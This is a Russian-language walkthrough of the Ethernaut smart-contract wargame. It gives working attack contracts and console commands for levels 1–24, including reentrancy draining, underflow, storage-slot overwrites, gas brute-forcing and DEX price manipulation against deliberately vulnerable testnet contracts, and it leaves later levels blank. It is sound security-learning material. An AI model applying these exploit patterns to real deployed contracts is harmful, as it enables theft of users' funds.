![Ethernaut](https://ethernaut.openzeppelin.com/)

### 1. Fallback (*)
Две точки где можно сменить владельца. contribute() - не вариант - понадобится много транзакций и эфира.
А вот receive() - самое то, достаточно отправить на контракт немножко эфира. Только сначала надо всеже воспользоваться contribute()
>contribute({value: 1})
>sendTransaction({from: player, to: contract.address, value: 1})
>contract.withdraw()


### 2. Fallout (*)
Этот уровень озадачил меня своей простотой. Всего-то вызвать функцию, которая должна была иницировать контракт
>contract.Fal1out({value: 1000})

### 3. Coin Flip (**)
Здесь все просто - весь алгоритм есть в контракте-жертве. Напишу я контракт который будет все считать за меня и вызывать flip()
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract NoRandomness {
    address CoinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address cf) {
        CoinFlip = cf;
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return ICoinFlip(CoinFlip).flip(side);
    }
}
```

### 4. Telephone (*)
Здесь, чтобы стать владельцем нужно писать контракт из которого вызвать changeOwner(player)
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract BrokenPhone {

    function crack(address phone, address new_owner) external {
        ITelephone(phone).changeOwner(new_owner);
    }
}
```

### 5. Token (**)
Кажется, здесь пахнет переполнением...))
Да, это оно)))
>await contract.balanceOf(player) //проверяю свой баланс. Как и обещали == 20
>contract.transfer(contract.address, 21) //атака!
>await contract.balanceOf(player) //охренеть!

### 6. Delegation (**)
Ссылки на ссылки. Момент и я разберусь. Ага, нужно получить селектор функции pwn() и отправить его вместе с 1 wei. Всего делов-то
bytes4(keccak256("pwn()")) = 0xdd365b8b 
cast keccak "pwn()" =        0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab
>const sig = _ethers.utils.keccak256(_ethers.utils.toUtf8Bytes("pwn()")).substr(0,10)
>sendTransaction({data: sig, from: player, to: contract.address})


### 7. Force (***)
Повышение сложности - ***
Но оказывается я знаю, что делать - контракт камикадце) Контракт будет минималистичен:
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract Kamikadze {
    constructor(address a) payable {
        selfdestruct(payable(a));
    }
}
```


### 8. Vault (**)
>contract.address
'0xA364FfB7796Af2327592674cC542B871fFA015c4'
Прочитать слот 1 могу с помощью cast от Foundry
>cast storage 0xA364FfB7796Af2327592674cC542B871fFA015c4 1 --rpc-url "https://ethereum-sepolia.publicnode.com"
0x412076657279207374726f6e67207365637265742070617373776f7264203a29
>contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')

### 9. King (***)
Сидел, смотрел минуты две - ни к чему не прикопаться!... Только если действующего короля не сместить. А это можно сделать только если король - контракт не принимающий эфир! Хе-хе... Минуточку))
Ok, вышло больше минуты. С чтением документации заняло все полчаса если не больше. А надо было только удалить receive() из того, что написал сразу :/
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract DeafKing {

    function overthrowTheKing(address king) public payable returns(bool) {
        (bool success, ) = payable(king).call{value: msg.value}("");
        return success;
    }

    // receive() external payable {
    //     // overthrowTheKing(msg.sender);
    //     revert();
    // }

    fallback() external payable { 
        revert();
    }
}
```

### 10. Re-entrancy (***)
Классический пример - классическая атака
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract TheftOfAges {
    event Response(bool success, bytes data);
    IReentrance reentrance;

    constructor(address r) public payable {
        reentrance = IReentrance(r);
        reentrance.donate{value: msg.value}(address(this));
    }

    function withdraw(uint _amount) public {
        reentrance.withdraw(_amount);
    }

    receive() external payable {
        uint256 value = reentrance.balanceOf(address(this));
        uint256 amount = address(reentrance).balance;
        if(value > amount) value = amount;
            reentrance.withdraw(value);
    }
}
```


### 11. Elevator (**)
В этой задача так же нужно пистаь свой контракт в котором isLastFloor() будет возвращать попеременно false/true
Л - Логика!
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract FlipElevator {
    uint256 counter = 1;

    function isLastFloor(uint256 floor) external returns(bool res) {
        counter++;
        res = (counter & 1) == 1;
    }

    function ToTheMoon(address elevator, uint256 top) public {
        IElevator(elevator).goTo(top);
    }
}
```

### 12. Privacy (***)
Таак, сложного мало - считать слоты - нужен 5й и привести это значение к bytes16
>cast storage 0x04211b24785a79381A8565AD8ca65E56Afa8606B 5 --rpc-url "https://ethereum-sepolia.publicnode.com"
0x9a72a73f65a56cd01bb97958b04cd7544e3c87a5e111771246d594b8f63fbed3
искомое значение: 0x9a72a73f65a56cd01bb97958b04cd754
>contract.unlock("0x9a72a73f65a56cd01bb97958b04cd754")
Easy!

### 13. Gatekeeper One (****)
Вот и добрался я до первого с 4мя звездами. Страшно, блин - пойду поем сначала...
Хотя любопытсво сильнее
msg.sender != tx.origin -> значит вызывать из контракта
gasleft() % 8191 == 0 -> с контролем доступного газа для функции, значит через call
gateThree -> с игрой bytes8 производной от моего адреса
Вот теперь можно пойти поесть))
gateThree -> _gateKey = uint256(uint160(tx.origin) & 0xFFFFFFFF0000FFFF) = 0x8d76a127000063EB
А вот считать оставшийся газ который нужно передать в функцию мне лень. Пусть сам перебирает
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperEnter {
    event Response(bool success, bytes data, uint256 gas);


    function loop(address gatekeeper, uint256 counter) public {
        bytes8 key = bytes8(uint64(uint160(msg.sender) & 0xFFFFFFFF0000FFFF));
        uint256 gas = 8191 + counter + 23000;
        for(uint256 i = gas; i > (8191 + counter); i--) {
            if(crack(gatekeeper, key, i) == true) {
                return;
            }
        }
    }

    function crack(address gatekeeper, bytes8 key, uint gas_value) internal returns(bool){

        (bool success, bytes memory data) = gatekeeper.call{gas: gas_value}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        if(success) {
            emit Response(success, data, gas_value);
        }
        return success;
    }
}
```



### 14. Gatekeeper Two (***)
Итак, расследование:
msg.sender != tx.origin -> опять вызывать из контракта
x := extcodesize(caller()) == 0 -> причем атакующая функция в конструкторе
gateThree снова битиками вертеть. Ну, ок, поехали!
Даже думать не пришлось))) 
``` // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gatekeeper2Enter {
    event Response(bool success, bytes data, uint256 gas);

    constructor(address gatekeeper) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool success, bytes memory data) = gatekeeper.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(key))
        );
    }
}
```
Awesome work! You’re halfway through Ethernaut and getting pretty good at breaking things. Working as a Blockchain Security Researcher at OpenZeppelin could be fun... https://grnh.se/fdbf1c043us

https://www.openzeppelin.com/jobs/opening?gh_jid=4254142003&gh_src=fdbf1c043us


### 15. Naught Coin (***)
Первые три минуты кажется, что к контракту не придраться. А потом - Эврика! - approve )))
>contract.approve("0x8f8DCA09a9569698bd9d318E597bf33BA1028aA6", "1000000000000000000000000")
А потом в Remix перевести на свой другой счет все монеты - минутное дело!
transferFrom(player, "0x8f8DCA09a9569698bd9d318E597bf33BA1028aA6", "1000000000000000000000000")
https://sepolia.etherscan.io/tx/0x01389af94bee37022fbd2b37fbd59ca53976b727f2a5b24d4a8e7a6e8cb553ea


### 16. Preservation (****)
Я бы не дал этой задаче 4 звезды.
Кто-то решил вызывать библиотеки через delegatecall и таким образом переписывает локальный 0 слот.
Значит мне нужно в него отправить адрес моего контракта где setTime(uint256 addr) будет переписывать 2й слот - адрес владельца
```
contract Timekeeper {
  address public a;
  address public b;
  address public owner; 


  function setTime(uint256 addr) public {
    owner = address(uint160(addr));
  }  
}
```
>Preservation.setSecondTime(address(Timekeeper));
>Preservation.setFirstTime(player);


### 17. Recovery (***)
Из зацепок только sepolia etherscan. Иду смотреть по адресу контракта Recovery
https://sepolia.etherscan.io/address/0xF365Fa9536Be2c728E558bA9C6f34749f3416182#internaltx
Далее по транзакции видно 
Transfer 0.001 ETH From 0xa3e731...e56104d6 To 0xAF98ab...7acAB048
Transfer 0.001 ETH From 0xAF98ab...7acAB048 To 0x8F35d7...64a80C45 << Вот, что я ищу!

0x8F35d71602e7868DD9D7e3a3fdeF155f64a80C45 - адрес SimpleToken
Можно вызвать в remix его функцию transfer или destroy
Остальсь понять на какой адрес отправлять эфир. Отправлю на свой адрес

### 18. MagicNumber (***)
Мне нужен контракт который просто возвращает 42, чтобы у него ни спросили. FALLBACK конечно же
```
contract MagicNumber {
    fallback() external payable { 
        assembly {
            let res:=mload(0x40)
            mstore(res, 42)
            return(res,0x20)
        }
    }
}```
Нет не так. Меньше кода - еще меньше
```
object "Contract" {
    // This is the constructor code of the contract.
    code {
        // Deploy the contract
        datacopy(0, dataoffset("runtime"), datasize("runtime"))
        return(0, datasize("runtime"))
    }

    object "runtime" {
        code {
            let res:=mload(0x40)
            mstore(res, 42)
            return(res,0x20)
        }
    }
  }
```

### 19. Alien Codex (****)
>cast storage 0x434894aE876e082EDB94641014E8fc7A2C8eadC5 0 --rpc-url "https://ethereum-sepolia.publicnode.com"
0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
                        0x0bc04aa6aac163a6b3667636d798fa053d43bd11 - owner
0x000000000000000000000001                                         - bool public contact;                        
>cast storage 0x434894aE876e082EDB94641014E8fc7A2C8eadC5 1 --rpc-url "https://ethereum-sepolia.publicnode.com"
0x0000000000000000000000000000000000000000000000000000000000000005 - codex.length

>_ethers.utils.keccak256(_ethers.utils.defaultAbiCoder.encode(["uint256"], [1]))
'0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6' - first element of dynamic array codex

uint256.max - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1 = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a - index of dynamic array codex -> slot 0

>contract.retract()
>contract.retract()
>contract.retract()
>contract.retract()
>contract.retract()
>contract.retract()
>contract.revise('0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a', '0x000000000000000000000001000003414ba674ebdf64c1e78d76a127d95463eb')
>await contract.owner()
'0x000003414bA674eBdf64C1E78d76a127d95463EB'


### 20. Denial (***)
Чет вторая задача с которой с первого раза не справился. Хм... Пришло время думать :/
Короче надо сделать так, чтобы вызов call забирал весь свободный газ. Или больше 1 млн
Как вариант - круговой вызов, да еще и assert(false)
```
contract Wilys {
    Denial denial;
    constructor(address payable a) {
        denial = Denial(a);
    }

    receive() external payable { 
        denial.withdraw();
        assert(false);
    }
}
```

### 21. Shop (**)
После предыдущей задачи это просто. Снова нужен контракт, а в контракте в зависимости от флага покупки подставляю цену больше или меньше от прайса. Easy - я э говорил)
```
contract Buyer {
    Shop shop;
    constructor(address a) {
        shop = Shop(a);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        if(shop.isSold() == false) {
            return shop.price() + 10;
        } else {
            return shop.price() - 10;
        }
    }
}
```

### 22. Dex (**)
Вот она - токеномика))
>Number(await contract.balanceOf('0x1ebc77Cb6FD737c6d0ef827B7Dfd7bebD89De190', player))
10
Для удобства
>const t1 = '0x1ebc77Cb6FD737c6d0ef827B7Dfd7bebD89De190'
>const t2 = '0x09102cC7Bf1F1CE5295dF0A4cD47c9031f0dd860'
>await contract.getSwapPrice(t1, t2, 10)
10, цена 1:1

>await contract.approve(contract.address, 10000)
>await contract.swap(t1, t2, 1)
>await contract.getSwapPrice(t1, t2, 10)
9 - ага, все правильно, цена меняется. Теперь несколько операций для победы
>await contract.swap(t1, t2, 9)
>Number(await contract.balanceOf(t2, player))
19
>await contract.swap(t2, t1, 19)
>Number(await contract.balanceOf(t1, player))
22
>await contract.swap(t1, t2, 22)
>Number(await contract.balanceOf(t2, player))
27
>await contract.swap(t2, t1, 27)
>await contract.swap(t1, t2, 35)
>await contract.swap(t2, t1, 51)
>await contract.swap(t1, t2, 95) - error
>await contract.swap(t1, t2, 5)
>Number(await contract.balanceOf(t1, player))
90
>Number(await contract.balanceOf(t2, player))
36
>await contract.swap(t2, t1, 36)
>Number(await contract.balanceOf(t1, player))
99
...
>Number(await contract.balanceOf(t1, player))
107
>await contract.swap(t1, t2, 3)
>Number(await contract.balanceOf(t2, player))
110
>Number(await contract.balanceOf(t1, player))
104

### 23. Dex Two (**)
Отличается от предыдущего отсутствием проверки в swap на принадлежность к токенам `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
А это значит можно добавить свой токен и слить все через него
SwappableTokenTwo.deploy()
SwappableTokenTwo.approve(contract.address, 10000000000)
SwappableTokenTwo.transfer(contract.address, 100) //и переслать немног токенов в этот контракт

>const t1 = await contract.token1()
>const t2 = await contract.token2()
>const t3 = await SwappableTokenTwo.address
>await contract.approve(contract.address, 10000)
>Number(await contract.balanceOf(t1, player))
10 - как и обещали)
>Number(await contract.balanceOf(t3, contract.address))
100
>await contract.swap(t3, t2, 100)
>await contract.swap(t3, t1, 200)

### 24. Puzzle Wallet (****)
Посмотрю, что в этом контракте в storage
cast storage 0x725595BA16E76ED1F6cC1e1b65A88365cC494824 0 --rpc-url "https://ethereum-sepolia.publicnode.com"
0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824 - 0 address public pendingAdmin
0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824 - 1 address public admin
0x0000000000000000000000000000000000000000000000000000000000000000 - 2-7
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;    //slot 0
    address public admin;           //slot 1
    ...
}
contract PuzzleWallet {
    address public owner;           //slot 0
    uint256 public maxBalance;      //slot 1
    ...
}
Сначала я запрошу администво через pendingAdmin. Это поменяет в PuzzleWallet адрес владельца контракта.
Открываю remix, PuzzleProxy as address, вызывааю PuzzleProxy.proposeNewAdmin(player)
Теперь я админ в PuzzleWallet. А это значит могу добавить себя в Whitelist
>await contract.addToWhitelist(player)


нет - , а после вызвав setMaxBalance() указав в аргументе свой адрес переписать в PuzzleProxy адрес admin. 


>let dd = _ethers.utils.defaultAbiCoder.encode([ "bytes4", "address" ], [ _ethers.utils.keccak256(_ethers.utils.toUtf8Bytes("setMaxBalance(uint256)")).substr(0,10), player ])
>await contract.multicall([dd])


### 25. Motorbike (***)


### 26. DoubleEntryPoint (**)


### 27. Good Samaritan (***)


### 28. Gatekeeper Three (***)


### 29. Switch (****)

